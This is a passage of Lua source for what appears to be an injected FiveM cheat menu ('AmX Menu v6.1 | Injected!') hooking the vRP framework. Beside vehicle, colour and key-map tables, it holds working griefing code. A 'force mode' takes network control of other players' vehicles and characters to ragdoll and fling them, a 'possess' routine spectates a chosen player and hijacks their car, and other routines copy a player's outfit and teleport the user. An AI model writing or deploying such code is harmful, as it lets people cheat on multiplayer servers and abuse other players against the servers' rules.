	"HALFTRACK",
	"KHANJALI",
	"RHINO",
	"SCARAB",
	"SCARAB2",
	"SCARAB3",
	"THRUSTER",
	"TRAILERSMALL2"
}
local cj = {
	"BENSON",
	"BIFF",
	"CERBERUS",
	"CERBERUS2",
	"CERBERUS3",
	"HAULER",
	"HAULER2",
	"MULE",
	"MULE2",
	"MULE3",
	"MULE4",
	"PACKER",
	"PHANTOM",
	"PHANTOM2",
	"PHANTOM3",
	"POUNDER",
	"POUNDER2",
	"STOCKADE",
	"STOCKADE3",
	"TERBYTE",
	"CABLECAR",
	"FREIGHT",
	"FREIGHTCAR",
	"FREIGHTCONT1",
	"FREIGHTCONT2",
	"FREIGHTGRAIN",
	"METROTRAIN",
	"TANKERCAR"
}
local ck = {
	{
		"Black",
		0
	},
	{
		"Carbon Black",
		147
	},
	{
		"Graphite",
		1
	},
	{
		"Anhracite Black",
		11
	},
	{
		"Black Steel",
		2
	},
	{
		"Dark Steel",
		3
	},
	{
		"Silver",
		4
	},
	{
		"Bluish Silver",
		5
	},
	{
		"Rolled Steel",
		6
	},
	{
		"Shadow Silver",
		7
	},
	{
		"Stone Silver",
		8
	},
	{
		"Midnight Silver",
		9
	},
	{
		"Cast Iron Silver",
		10
	},
	{
		"Red",
		27
	},
	{
		"Torino Red",
		28
	},
	{
		"Formula Red",
		29
	},
	{
		"Lava Red",
		150
	},
	{
		"Blaze Red",
		30
	},
	{
		"Grace Red",
		31
	},
	{
		"Garnet Red",
		32
	},
	{
		"Sunset Red",
		33
	},
	{
		"Cabernet Red",
		34
	},
	{
		"Wine Red",
		143
	},
	{
		"Candy Red",
		35
	},
	{
		"Hot Pink",
		135
	},
	{
		"Pfsiter Pink",
		137
	},
	{
		"Salmon Pink",
		136
	},
	{
		"Sunrise Orange",
		36
	},
	{
		"Orange",
		38
	},
	{
		"Bright Orange",
		138
	},
	{
		"Gold",
		99
	},
	{
		"Bronze",
		90
	},
	{
		"Yellow",
		88
	},
	{
		"Race Yellow",
		89
	},
	{
		"Dew Yellow",
		91
	},
	{
		"Dark Green",
		49
	},
	{
		"Racing Green",
		50
	},
	{
		"Sea Green",
		51
	},
	{
		"Olive Green",
		52
	},
	{
		"Bright Green",
		53
	},
	{
		"Gasoline Green",
		54
	},
	{
		"Lime Green",
		92
	},
	{
		"Midnight Blue",
		141
	},
	{
		"Galaxy Blue",
		61
	},
	{
		"Dark Blue",
		62
	},
	{
		"Saxon Blue",
		63
	},
	{
		"Blue",
		64
	},
	{
		"Mariner Blue",
		65
	},
	{
		"Harbor Blue",
		66
	},
	{
		"Diamond Blue",
		67
	},
	{
		"Surf Blue",
		68
	},
	{
		"Nautical Blue",
		69
	},
	{
		"Racing Blue",
		73
	},
	{
		"Ultra Blue",
		70
	},
	{
		"Light Blue",
		74
	},
	{
		"Chocolate Brown",
		96
	},
	{
		"Bison Brown",
		101
	},
	{
		"Creeen Brown",
		95
	},
	{
		"Feltzer Brown",
		94
	},
	{
		"Maple Brown",
		97
	},
	{
		"Beechwood Brown",
		103
	},
	{
		"Sienna Brown",
		104
	},
	{
		"Saddle Brown",
		98
	},
	{
		"Moss Brown",
		100
	},
	{
		"Woodbeech Brown",
		102
	},
	{
		"Straw Brown",
		99
	},
	{
		"Sandy Brown",
		105
	},
	{
		"Bleached Brown",
		106
	},
	{
		"Schafter Purple",
		71
	},
	{
		"Spinnaker Purple",
		72
	},
	{
		"Midnight Purple",
		142
	},
	{
		"Bright Purple",
		145
	},
	{
		"Cream",
		107
	},
	{
		"Ice White",
		111
	},
	{
		"Frost White",
		112
	}
}
local cl = {
	{
		"Black",
		12
	},
	{
		"Gray",
		13
	},
	{
		"Light Gray",
		14
	},
	{
		"Ice White",
		131
	},
	{
		"Blue",
		83
	},
	{
		"Dark Blue",
		82
	},
	{
		"Midnight Blue",
		84
	},
	{
		"Midnight Purple",
		149
	},
	{
		"Schafter Purple",
		148
	},
	{
		"Red",
		39
	},
	{
		"Dark Red",
		40
	},
	{
		"Orange",
		41
	},
	{
		"Yellow",
		42
	},
	{
		"Lime Green",
		55
	},
	{
		"Green",
		128
	},
	{
		"Forest Green",
		151
	},
	{
		"Foliage Green",
		155
	},
	{
		"Olive Darb",
		152
	},
	{
		"Dark Earth",
		153
	},
	{
		"Desert Tan",
		154
	}
}
local cm = {
	{
		"Brushed Steel",
		117
	},
	{
		"Brushed Black Steel",
		118
	},
	{
		"Brushed Aluminum",
		119
	},
	{
		"Chrome",
		120
	},
	{
		"Pure Gold",
		158
	},
	{
		"Brushed Gold",
		159
	}
}
local cn = {
	["ESC"] = 322,
	["F1"] = 288,
	["F2"] = 289,
	["F3"] = 170,
	["F5"] = 166,
	["F6"] = 167,
	["F7"] = 168,
	["F8"] = 169,
	["F9"] = 56,
	["F10"] = 57,
	["F11"] = 344,
	["~"] = 243,
	["1"] = 157,
	["2"] = 158,
	["3"] = 160,
	["4"] = 164,
	["5"] = 165,
	["6"] = 159,
	["7"] = 161,
	["8"] = 162,
	["9"] = 163,
	["-"] = 84,
	["="] = 83,
	["BACKSPACE"] = 177,
	["TAB"] = 37,
	["Q"] = 44,
	["W"] = 32,
	["E"] = 38,
	["R"] = 45,
	["T"] = 245,
	["Y"] = 246,
	["U"] = 303,
	["P"] = 199,
	["["] = 39,
	["]"] = 40,
	["ENTER"] = 18,
	["CAPS"] = 137,
	["A"] = 34,
	["S"] = 8,
	["D"] = 9,
	["F"] = 23,
	["G"] = 47,
	["H"] = 74,
	["K"] = 311,
	["L"] = 182,
	["LEFTSHIFT"] = 21,
	["Z"] = 20,
	["X"] = 73,
	["C"] = 26,
	["V"] = 0,
	["B"] = 29,
	["N"] = 249,
	["M"] = 244,
	[","] = 82,
	["."] = 81,
	["LEFTCTRL"] = 36,
	["LEFTALT"] = 19,
	["SPACE"] = 22,
	["RIGHTCTRL"] = 70,
	["HOME"] = 213,
	["PAGEUP"] = 10,
	["PAGEDOWN"] = 11,
	["DELETE"] = 178,
	["LEFT"] = 174,
	["RIGHT"] = 175,
	["TOP"] = 27,
	["DOWN"] = 173,
	["NENTER"] = 201,
	["N4"] = 124,
	["N5"] = 126,
	["N6"] = 125,
	["N+"] = 96,
	["N-"] = 97,
	["N7"] = 117,
	["N8"] = 61,
	["N9"] = 118,
	["MOUSE1"] = 24
}
local co = false;
local cp = 1;
local cq = 1;
local cr = 1;
local cs = 1;
local ct = {
	0.75,
	0.025,
	0.1,
	0.2,
	0.3,
	0.4,
	0.5,
	0.6,
	0.7
}
local cu = {
	0.1,
	0.025,
	0.2,
	0.3,
	0.400,
	0.425
}
local cv = 0;
function InitializeIntro(scaleform, ba, cw)
	local scaleform = RequestScaleformMovie(scaleform)
	while not HasScaleformMovieLoaded(scaleform) do
		Citizen.Wait(1)
	end;
	PushScaleformMovieFunction(scaleform, "SHOW_SHARD_WASTED_MP_MESSAGE")
	PushScaleformMovieFunctionParameterString(ba)
	PushScaleformMovieFunctionParameterString(cw)
	PopScaleformMovieFunctionVoid()
	PushScaleformMovieMethodParameterInt(5)
	return scaleform
end;
if cv == 0 then
	Citizen.CreateThread(function()
		while cv < 300 do
			Citizen.Wait(2)
			introScaleform = InitializeIntro("mp_big_message_freemode", "~r~AmX Menu v6.1 ~v~| ~g~Injected!", "Open With ~r~B ~v~or ~B~, ")
			DrawScaleformMovieFullscreen(introScaleform, 80, 80, 80, 255)
			cv = cv + 1
		end
	end)
end;
vRP = Proxy.getInterface("vRP")
local function cA()
	ForceTog = not ForceTog;
	if ForceTog then
		Citizen.CreateThread(function()
			ShowInfo("Force Mode ~g~[ON] ~g~\n~s~Active Mode ---> KEY ~y~[E] ")
			local cB = cn["E"]
			local cC = 0.5;
			local cD = false;
			local cE = 0;
			local cF = 15;
			local cG = false;
			local cH = false;
			function forcetick()
				if cD then
					cE = cE + 1;
					if cE >= cF then
						cE = 0;
						cD = false
					end
				end;
				if IsDisabledControlPressed(0, cB) and not cD and not cG then
					cD = true;
					cG = true
				end;
				if cH then
					cH = false;
					local cI = PlayerPedId()
					local cJ = GetGameplayCamRot(2)
					local cK = 5;
					local cL = -(math.sin(math.rad(cJ.z)) * cK * 10)
					local cM = math.cos(math.rad(cJ.z)) * cK * 10;
					local cN = cK * cJ.x * 0.2;
					local cO = GetVehiclePedIsIn(cI, false)
					for cP in EnumerateVehicles() do
						SetEntityInvincible(cP, false)
						if IsEntityOnScreen(cP) and cP ~= cO then
							ApplyForceToEntity(cP, 1, cL, cM, cN, 0, 0, 0, true, false, true, true, true, true)
						end
					end;
					for cP in EnumeratePeds() do
						if IsEntityOnScreen(cP) and cP ~= cI then
							ApplyForceToEntity(cP, 1, cL, cM, cN, 0, 0, 0, true, false, true, true, true, true)
						end
					end
				end;
				if IsDisabledControlPressed(0, cB) and not cD and cG then
					cD = true;
					cH = true;
					cG = false
				end;
				if cG then
					local cI = PlayerPedId()
					local cO = GetVehiclePedIsIn(cI, false)
					Markerloc = GetGameplayCamCoord() + RotationToDirection(GetGameplayCamRot(2)) * 20;
					DrawMarker(28, Markerloc, 0.0, 0.0, 0.0, 0.0, 180.0, 0.0, 1.0, 1.0, 1.0, 180, 0, 0, 35, false, true, 2, nil, nil, false)
					for cP in EnumerateVehicles() do
						SetEntityInvincible(cP, true)
						if IsEntityOnScreen(cP) and cP ~= cO then
							RequestControlOnce(cP)
							FreezeEntityPosition(cP, false)
							Oscillate(cP, Markerloc, 0.5, 0.3)
						end
					end;
					for cP in EnumeratePeds() do
						if IsEntityOnScreen(cP) and cP ~= PlayerPedId() then
							RequestControlOnce(cP)
							SetPedToRagdoll(cP, 4000, 5000, 0, true, true, true)
							FreezeEntityPosition(cP, false)
							Oscillate(cP, Markerloc, 0.5, 0.3)
						end
					end
				end
			end;
			while ForceTog do
				forcetick()
				Wait(0)
			end
		end)
	else
		ShowInfo("Force Mode ~r~[OFF]")
	end
end;
function GetSeatPedIsIn(ped)
	if not IsPedInAnyVehicle(ped, false) then
		return
	else
		veh = GetVehiclePedIsIn(ped)
		for i = 0, GetVehicleMaxNumberOfPassengers(veh) do
			if GetPedInVehicleSeat(veh) then
				return i
			end
		end
	end
end;
function GetCamDirFromScreenCenter()
	local pos = GetGameplayCamCoord()
	local cQ = ScreenToWorld(0, 0)
	local cR = SubVectors(cQ, pos)
	return cR
end;
local function cS(cT)
	local bh = {}
	local cU = GetGameTimer() / 1000;
	bh.r = math.floor(math.sin(cU * cT + 0) * 127 + 128)
	bh.g = math.floor(math.sin(cU * cT + 2) * 127 + 128)
	bh.b = math.floor(math.sin(cU * cT + 4) * 127 + 128)
	return bh
end;
function ScreenToWorld(cV)
	local cW = GetGameplayCamRot(2)
	local cX = GetGameplayCamCoord()
	local cY = 0.0;
	local cZ = 0.0;
	local c_ = 0.0;
	local d0 = 0.0;
	local d1 = RotationToDirection(cW)
	local d2 = vector3(cW.x + 10.0, cW.y + 0.0, cW.z + 0.0)
	local d3 = vector3(cW.x - 10.0, cW.y + 0.0, cW.z + 0.0)
	local d4 = vector3(cW.x, cW.y + 0.0, cW.z + -10.0)
	local d5 = RotationToDirection(vector3(cW.x, cW.y + 0.0, cW.z + 10.0)) - RotationToDirection(d4)
	local d6 = RotationToDirection(d2) - RotationToDirection(d3)
	local d7 = -math.rad(cW.y)
	vect33 = d5 * math.cos(d7) - d6 * math.sin(d7)
	vect34 = d5 * math.sin(d7) - d6 * math.cos(d7)
	local d8, x1, y1 = WorldToScreenRel(cX + d1 * 10.0 + vect33 + vect34)
	if not d8 then
		cY = x1;
		cZ = y1;
		return cX + d1 * 10.0
	end;
	local d9, x2, y2 = WorldToScreenRel(cX + d1 * 10.0)
	if not d9 then
		d0 = x2;
		c_ = y2;
		return cX + d1 * 10.0
	end;
	if math.abs(cY - d0) < 0.001 or math.abs(cZ - c_) < 0.001 then
		return cX + d1 * 10.0
	end;
	local x = (cV.x - d0) / (cY - d0)
	local y = (cV.y - c_) / (cZ - c_)
	return cX + d1 * 10.0 + vect33 * x + vect34 * y
end;
function WorldToScreenRel(da)
	local db, x, y = GetScreenCoordFromWorldCoord(da.x, da.y, da.z)
	if not db then
		return false
	end;
	screenCoordsx = (x - 0.5) * 2.0;
	screenCoordsy = (y - 0.5) * 2.0;
	return true, screenCoordsx, screenCoordsy
end;
function RotationToDirection(dc)
	local dd = math.rad(dc.z)
	local de = math.rad(dc.x)
	local df = math.abs(math.cos(de))
	return vector3(-math.sin(dd) * df, math.cos(dd) * df, math.sin(de))
end;
local function dg()
	local a2 = GetGameplayCamRelativeHeading() + GetEntityHeading(PlayerPedId())
	local dh = GetGameplayCamRelativePitch()
	local x = -math.sin(a2 * math.pi / 180.0)
	local y = math.cos(a2 * math.pi / 180.0)
	local z = math.sin(dh * math.pi / 180.0)
	local di = math.sqrt(x * x + y * y + z * z)
	if di ~= 0 then
		x = x / di;
		y = y / di;
		z = z / di
	end;
	return x, y, z
end;
function ApplyForce(entity, d1)
	ApplyForceToEntity(entity, 3, d1, 0, 0, 0, false, false, true, true, false, true)
end;
function RequestControlOnce(entity)
	if not NetworkIsInSession or NetworkHasControlOfEntity(entity) then
		return true
	end;
	SetNetworkIdCanMigrate(NetworkGetNetworkIdFromEntity(entity), true)
	return NetworkRequestControlOfEntity(entity)
end;
function RequestControl(entity)
	Citizen.CreateThread(function()
		local dj = 0;
		while not RequestControlOnce(entity) and dj <= 12 do
			dj = dj + 1;
			Wait(0)
		end;
		return dj <= 12
	end)
end;
function Oscillate(entity, dk, dl, dm)
	local dn = ScaleVector(SubVectors(dk, GetEntityCoords(entity)), dl * dl)
	local dp = AddVectors(ScaleVector(GetEntityVelocity(entity), 2.0 * dl * dm), vector3(0.0, 0.0, 0.1))
	local dq = SubVectors(dn, dp)
	ApplyForce(entity, dq)
end;
function ShowMPMessage(ba, dr, ds)
	Citizen.CreateThread(function()
		Citizen.Wait(0)
		function Initialize(scaleform)
			local scaleform = RequestScaleformMovie(scaleform)
			while not HasScaleformMovieLoaded(scaleform) do
				Citizen.Wait(0)
			end;
			PushScaleformMovieFunction(scaleform, "SHOW_SHARD_WASTED_MP_MESSAGE")
			PushScaleformMovieFunctionParameterString(ba)
			PushScaleformMovieFunctionParameterString(dr)
			PopScaleformMovieFunctionVoid()
			Citizen.SetTimeout(6500, function()
				PushScaleformMovieFunction(scaleform, "SHARD_ANIM_OUT")
				PushScaleformMovieFunctionParameterInt(1)
				PushScaleformMovieFunctionParameterFloat(0.33)
				PopScaleformMovieFunctionVoid()
				Citizen.SetTimeout(3000, function()
					EndScaleformMovieMethod()
				end)
			end)
			return scaleform
		end;
		scaleform = Initialize("mp_big_message_freemode")
		while true do
			Citizen.Wait(0)
			DrawScaleformMovieFullscreen(scaleform, 255, 255, 255, 150, 0)
		end
	end)
end;
function ShowInfo(r)
	SetNotificationTextEntry("STRING")
	AddTextComponentString(r)
	DrawNotification(true, false)
end;
function DrawTxt(r, x, y, O, dt)
	RegisterFontFile('A9eelsh')
	fontId = RegisterFontId('A9eelsh')
	SetTextFont(fontId)
	SetTextProportional(1)
	SetTextScale(O, dt)
	SetTextDropshadow(1, 0, 0, 0, 255)
	SetTextEdge(1, 0, 0, 0, 255)
	SetTextDropShadow()
	SetTextOutline()
	SetTextEntry("STRING")
	AddTextComponentString(r)
	DrawText(x, y)
end;
function DrawText3D(x, y, z, r)
	local du, dv, dw = GetScreenCoordFromWorldCoord(x, y, z)
	local dx, dy, dz = table.unpack(GetGameplayCamCoords())
	local dA = GetDistanceBetweenCoords(dx, dy, dz, x, y, z, 1)
	local O = 1 / dA * 2;
	local dB = 1 / GetGameplayCamFov() * 100;
	local O = O * dB;
	if du then
		SetTextScale(0.0 * O, 0.55 * O)
		RegisterFontFile('A9eelsh')
        fontId = RegisterFontId('A9eelsh')
        etTextFont(fontId)
		SetTextProportional(1)
		SetTextColour(255, 255, 255, 255)
		SetTextDropshadow(0, 0, 0, 0, 255)
		SetTextEdge(2, 0, 0, 0, 150)
		SetTextDropShadow()
		SetTextOutline()
		SetTextEntry("STRING")
		SetTextCentre(1)
		AddTextComponentString(r)
		DrawText(dv, dw)
	end
end;
local dC = {
	__gc = function(dD)
		if dD.destructor and dD.handle then
			dD.destructor(dD.handle)
		end;
		dD.destructor = nil;
		dD.handle = nil
	end
}
local function dE()
	local dF = GetNumberOfPedDrawableVariations(PlayerPedId(), 0)
	local faceItemsList = {}
	for i = 1, dF do
		faceItemsList[i] = i
	end;
	return faceItemsList
end;
local function dG(dH)
	local dI = GetNumberOfPedTextureVariations(PlayerPedId(), 0, dH)
	local dJ = {}
	for i = 1, dI do
		dJ[i] = i
	end;
	return dJ
end;
local function dK()
	local dL = GetNumberOfPedDrawableVariations(PlayerPedId(), 2)
	local hairItemsList = {}
	for i = 1, dL do
		hairItemsList[i] = i
	end;
	return hairItemsList
end;
local function dM(dN)
	local dO = GetNumberOfPedTextureVariations(PlayerPedId(), 2, dN)
	local hairTextureList = {}
	for i = 1, dO do
		hairTextureList[i] = i
	end;
	return hairTextureList
end;
local function dP()
	local dQ = GetNumberOfPedDrawableVariations(PlayerPedId(), 1)
	local maskItemsList = {}
	for i = 1, dQ do
		maskItemsList[i] = i
	end;
	return maskItemsList
end;
local function dR()
	local dS = GetNumberOfPedPropDrawableVariations(PlayerPedId(), 0)
	local hatItemsList = {}
	for i = 1, dS do
		hatItemsList[i] = i
	end;
	return hatItemsList
end;
local function dT(dU)
	local dV = GetNumberOfPedPropTextureVariations(PlayerPedId(), 0, dU)
	local hatTexturesList = {}
	for i = 1, dV do
		hatTexturesList[i] = i
	end;
	return hatTexturesList
end;
local function dW(by)
	local ped = GetPlayerPed(by)
	local dX = PlayerPedId()
	hat = GetPedPropIndex(ped, 0)
	hat_texture = GetPedPropTextureIndex(ped, 0)
	glasses = GetPedPropIndex(ped, 1)
	glasses_texture = GetPedPropTextureIndex(ped, 1)
	ear = GetPedPropIndex(ped, 2)
	ear_texture = GetPedPropTextureIndex(ped, 2)
	watch = GetPedPropIndex(ped, 6)
	watch_texture = GetPedPropTextureIndex(ped, 6)
	wrist = GetPedPropIndex(ped, 7)
	wrist_texture = GetPedPropTextureIndex(ped, 7)
	head_drawable = GetPedDrawableVariation(ped, 0)
	head_palette = GetPedPaletteVariation(ped, 0)
	head_texture = GetPedTextureVariation(ped, 0)
	beard_drawable = GetPedDrawableVariation(ped, 1)
	beard_palette = GetPedPaletteVariation(ped, 1)
	beard_texture = GetPedTextureVariation(ped, 1)
	hair_drawable = GetPedDrawableVariation(ped, 2)
	hair_palette = GetPedPaletteVariation(ped, 2)
	hair_texture = GetPedTextureVariation(ped, 2)
	torso_drawable = GetPedDrawableVariation(ped, 3)
	torso_palette = GetPedPaletteVariation(ped, 3)
	torso_texture = GetPedTextureVariation(ped, 3)
	legs_drawable = GetPedDrawableVariation(ped, 4)
	legs_palette = GetPedPaletteVariation(ped, 4)
	legs_texture = GetPedTextureVariation(ped, 4)
	hands_drawable = GetPedDrawableVariation(ped, 5)
	hands_palette = GetPedPaletteVariation(ped, 5)
	hands_texture = GetPedTextureVariation(ped, 5)
	foot_drawable = GetPedDrawableVariation(ped, 6)
	foot_palette = GetPedPaletteVariation(ped, 6)
	foot_texture = GetPedTextureVariation(ped, 6)
	acc1_drawable = GetPedDrawableVariation(ped, 7)
	acc1_palette = GetPedPaletteVariation(ped, 7)
	acc1_texture = GetPedTextureVariation(ped, 7)
	acc2_drawable = GetPedDrawableVariation(ped, 8)
	acc2_palette = GetPedPaletteVariation(ped, 8)
	acc2_texture = GetPedTextureVariation(ped, 8)
	acc3_drawable = GetPedDrawableVariation(ped, 9)
	acc3_palette = GetPedPaletteVariation(ped, 9)
	acc3_texture = GetPedTextureVariation(ped, 9)
	mask_drawable = GetPedDrawableVariation(ped, 10)
	mask_palette = GetPedPaletteVariation(ped, 10)
	mask_texture = GetPedTextureVariation(ped, 10)
	aux_drawable = GetPedDrawableVariation(ped, 11)
	aux_palette = GetPedPaletteVariation(ped, 11)
	aux_texture = GetPedTextureVariation(ped, 11)
	SetPedPropIndex(dX, 0, hat, hat_texture, 1)
	SetPedPropIndex(dX, 1, glasses, glasses_texture, 1)
	SetPedPropIndex(dX, 2, ear, ear_texture, 1)
	SetPedPropIndex(dX, 6, watch, watch_texture, 1)
	SetPedPropIndex(dX, 7, wrist, wrist_texture, 1)
	SetPedComponentVariation(dX, 0, head_drawable, head_texture, head_palette)
	SetPedComponentVariation(dX, 1, beard_drawable, beard_texture, beard_palette)
	SetPedComponentVariation(dX, 2, hair_drawable, hair_texture, hair_palette)
	SetPedComponentVariation(dX, 3, torso_drawable, torso_texture, torso_palette)
	SetPedComponentVariation(dX, 4, legs_drawable, legs_texture, legs_palette)
	SetPedComponentVariation(dX, 5, hands_drawable, hands_texture, hands_palette)
	SetPedComponentVariation(dX, 6, foot_drawable, foot_texture, foot_palette)
	SetPedComponentVariation(dX, 7, acc1_drawable, acc1_texture, acc1_palette)
	SetPedComponentVariation(dX, 8, acc2_drawable, acc2_texture, acc2_palette)
	SetPedComponentVariation(dX, 9, acc3_drawable, acc3_texture, acc3_palette)
	SetPedComponentVariation(dX, 10, mask_drawable, mask_texture, mask_palette)
	SetPedComponentVariation(dX, 11, aux_drawable, aux_texture, aux_palette)
end;
local function dY(dZ, d_, e0)
	return coroutine.wrap(function()
		local e1, u = dZ()
		if not u or u == 0 then
			e0(e1)
			return
		end;
		local dD = {
			handle = e1,
			destructor = e0
		}
		setmetatable(dD, dC)
		local e2 = true;
		repeat
			coroutine.yield(u)
			e2, u = d_(e1)
		until not e2;
		dD.destructor, dD.handle = nil, nil;
		e0(e1)
	end)
end;
function EnumerateObjects()
	return dY(FindFirstObject, FindNextObject, EndFindObject)
end;
function EnumeratePeds()
	return dY(FindFirstPed, FindNextPed, EndFindPed)
end;
function EnumerateVehicles()
	return dY(FindFirstVehicle, FindNextVehicle, EndFindVehicle)
end;
function EnumeratePickups()
	return dY(FindFirstPickup, FindNextPickup, EndFindPickup)
end;
function table.contains(table, e3)
	for av, G in pairs(table) do
		if G == e3 then
			return true
		end
	end;
	return false
end;
function table.removekey(e4, e3)
	for i = 1, #e4 do
		if e4[i] == e3 then
			table.remove(e4, i)
		end
	end
end;
function AddVectors(e5, e6)
	return vector3(e5.x + e6.x, e5.y + e6.y, e5.z + e6.z)
end;
function SubVectors(e5, e6)
	return vector3(e5.x - e6.x, e5.y - e6.y, e5.z - e6.z)
end;
function ScaleVector(e7, a9)
	return vector3(e7.x * a9, e7.y * a9, e7.z * a9)
end;
function round(num, e8)
	local a9 = 10 ^ (e8 or 0)
	return math.floor(num * a9 + 0.5) / a9
end;
local function e9(r)
	if not r then
		r = "Input"
	end;
	DisplayOnscreenKeyboard(0, "", "", "", "", "", "", 30)
	while UpdateOnscreenKeyboard() == 0 do
		DrawTxt(r, 0.32, 0.37, 0.0, 0.4)
		DisableAllControlActions(0)
		if IsDisabledControlPressed(0, cn["ESC"]) then
			return ""
		end;
		Wait(0)
	end;
	if GetOnscreenKeyboardResult() then
		local bh = GetOnscreenKeyboardResult()
		Wait(0)
		return bh
	end
end;
function SpectatePlayer(u)
	local ea = GetPlayerPed(u)
	if Spectating then
		RequestCollisionAtCoord(GetEntityCoords(ea))
		NetworkSetInSpectatorMode(true, ea)
	else
		RequestCollisionAtCoord(GetEntityCoords(ea))
		NetworkSetInSpectatorMode(false, ea)
	end
end;
local function cP(eb)
	local ec = {}
	local ed = GetGameTimer() / 200;
	ec.r = math.floor(math.sin(ed * eb + 0) * 127 + 128)
	ec.g = math.floor(math.sin(ed * eb + 2) * 127 + 128)
	ec.b = math.floor(math.sin(ed * eb + 4) * 127 + 128)
	return ec
end;
local function ee(by)
	PossessingVeh = not PossessingVeh;
	if not PossessingVeh then
		SetEntityVisible(PlayerPedId(), true, 0)
		SetEntityCoords(PlayerPedId(), oldPlayerPos)
		SetEntityCollision(PlayerPedId(), true, 1)
	else
		SpectatePlayer(selectedPlayer)
		ShowInfo("~b~Checking Player...")
		Wait(3000)
		if IsPedInAnyVehicle(GetPlayerPed(selectedPlayer), 0) then
			SpectatePlayer(selectedPlayer)
			oldPlayerPos = GetEntityCoords(PlayerPedId())
			SetEntityVisible(PlayerPedId(), false, 0)
			SetEntityCollision(PlayerPedId(), false, 0)
		else
			SpectatePlayer(selectedPlayer)
			PossessingVeh = false;
			ShowInfo("~r~Player not in a vehicle!  (Try again?)")
		end;
		local Markerloc = nil;
		Citizen.CreateThread(function()
			local ped = GetPlayerPed(by)
			local veh = GetVehiclePedIsIn(ped, 0)
			while PossessingVeh do
				DrawTxt("~b~Possessing " .. GetPlayerName(by) .. "'s ~b~Vehicle", 0.1, 0.05, 0.0, 0.4)
				DrawTxt("~b~Controls:\n-------------------", 0.1, 0.2, 0.0, 0.4)
				DrawTxt("~b~W/S: Forward/Back\n~b~SPACEBAR: Up\n~b~CTRL: Down\n~b~X: Cancel", 0.1, 0.25, 0.0, 0.4)
				Markerloc = GetGameplayCamCoord() + RotationToDirection(GetGameplayCamRot(2)) * 20;
				DrawMarker(28, Markerloc, 0.0, 0.0, 0.0, 0.0, 180.0, 0.0, 1.0, 1.0, 1.0, 0, 0, 180, 35, false, true, 2, nil, nil, false)
				local ef = SubVectors(Markerloc, GetEntityCoords(veh))
				local eg = GetEntityCoords(veh)
				local eh = GetEntityForwardVector(veh)
				local ei = SubVectors(eg, eh)
				SetEntityCoords(PlayerPedId(), ei.x, ei.y, eg.z + 1.1)
				SetEntityNoCollisionEntity(PlayerPedId(), veh, 1)
				RequestControlOnce(veh)
				if IsDisabledControlPressed(0, cn["W"]) then
					ApplyForce(veh, ef * 0.1)
				end;
				if IsDisabledControlPressed(0, cn["S"]) then
					ApplyForce(veh, -(ef * 0.1))
				end;
				if IsDisabledControlPressed(0, cn["SPACE"]) then
					ApplyForceToEntity(veh, 3, 0.0, 0.0, 1.0, 0.0, 0.0, 0.0, 0, 0, 1, 1, 0, 1)
				end;
				if IsDisabledControlPressed(0, cn["LEFTCTRL"]) then
					ApplyForceToEntity(veh, 3, 0.0, 0.0, -1.0, 0.0, 0.0, 0.0, 0, 0, 1, 1, 0, 1)
				end;
				if IsDisabledControlPressed(0, cn["X"]) or GetEntityHealth(PlayerPedId()) < 5.0 then
					PossessingVeh = false;
					SetEntityVisible(PlayerPedId(), true, 0)
					SetEntityCoords(PlayerPedId(), oldPlayerPos)
					SetEntityCollision(PlayerPedId(), true, 1)
				end;
				Wait(0)
			end
		end)
	end
end;
function GetWeaponNameFromHash(ej)
	for i = 1, #bT do
		if GetHashKey(bT[i]) == ej then
			return string.sub(bT[i], 8)
		end
	end
end;
function TeleportToCoords()
	local x = e9("Enter ~r~X ~s~Coordinates", "", 100)
	local y = e9("Enter ~r~Y ~s~Coordinates", "", 100)
	local z = e9("Enter ~r~Z ~s~Coordinates", "", 100)
	local entity;
	if x ~= "" and y ~= "" and z ~= "" then
		if IsPedInAnyVehicle(GetPlayerPed(-1), 0) and GetPedInVehicleSeat(GetVehiclePedIsIn(GetPlayerPed(-1), 0), -1) == GetPlayerPed(-1) then
			entity = GetVehiclePedIsIn(GetPlayerPed(-1), 0)
		else
			entity = PlayerPedId()
		end;
		if entity then
			SetEntityCoords(entity, x + 0.5, y + 0.5, z + 0.5, 1, 0, 0, 1)
		end
	else
		ShowInfo("~r~Invalid Coordinates!")
	end
end;
local function ek()
	local el = 160.868;
	local em = -745.831;
	local en = 250.063;
	if el ~= "" and em ~= "" and en ~= "" then
		if IsPedInAnyVehicle(GetPlayerPed(-1), 0) and GetPedInVehicleSeat(GetVehiclePedIsIn(GetPlayerPed(-1), 0), -1) == GetPlayerPed(-1) then
			entity = GetVehiclePedIsIn(GetPlayerPed(-1), 0)
		else
			entity = GetPlayerPed(-1)
		end;
		if entity then
			SetEntityCoords(entity, el + 0.5, em + 0.5, en + 0.5, 1, 0, 0, 1)
		end
	end
end;
local function eo()
	local el = -365.425;
	local em = -131.809;
	local en = 37.873;
	if el ~= "" and em ~= "" and en ~= "" then
		if IsPedInAnyVehicle(GetPlayerPed(-1), 0) and GetPedInVehicleSeat(GetVehiclePedIsIn(GetPlayerPed(-1), 0), -1) == GetPlayerPed(-1) then
			entity = GetVehiclePedIsIn(GetPlayerPed(-1), 0)
		else
			entity = GetPlayerPed(-1)
		end;
		if entity then
			SetEntityCoords(entity, el + 0.5, em + 0.5, en + 0.5, 1, 0, 0, 1)
		end
	end
end;
local function ep()
	local el = 266.12;
	local em = -752.51;
	local en = 34.64;
	if el ~= "" and em ~= "" and en ~= "" then
		if IsPedInAnyVehicle(GetPlayerPed(-1), 0) and GetPedInVehicleSeat(GetVehiclePedIsIn(GetPlayerPed(-1), 0), -1) == GetPlayerPed(-1) then
			entity = GetVehiclePedIsIn(GetPlayerPed(-1), 0)
		else
			entity = GetPlayerPed(-1)
		end;
		if entity then
			SetEntityCoords(entity, el + 0.5, em + 0.5, en + 0.5, 1, 0, 0, 1)
		end
	end
end;
local function eq()
	local el = -15.32;
	local em = -1080.69;
	local en = 26.14;
	if el ~= "" and em ~= "" and en ~= "" then
		if IsPedInAnyVehicle(GetPlayerPed(-1), 0) and GetPedInVehicleSeat(GetVehiclePedIsIn(GetPlayerPed(-1), 0), -1) == GetPlayerPed(-1) then
			entity = GetVehiclePedIsIn(GetPlayerPed(-1), 0)
		else
			entity = GetPlayerPed(-1)
		end;
		if entity then
			SetEntityCoords(entity, el + 0.5, em + 0.5, en + 0.5, 1, 0, 0, 1)
		end
	end
end;
local function er()
	local el = 19.22;
	local em = -1108.71;
	local en = 29.8;
	if el ~= "" and em ~= "" and en ~= "" then
		if IsPedInAnyVehicle(GetPlayerPed(-1), 0) and GetPedInVehicleSeat(GetVehiclePedIsIn(GetPlayerPed(-1), 0), -1) == GetPlayerPed(-1) then
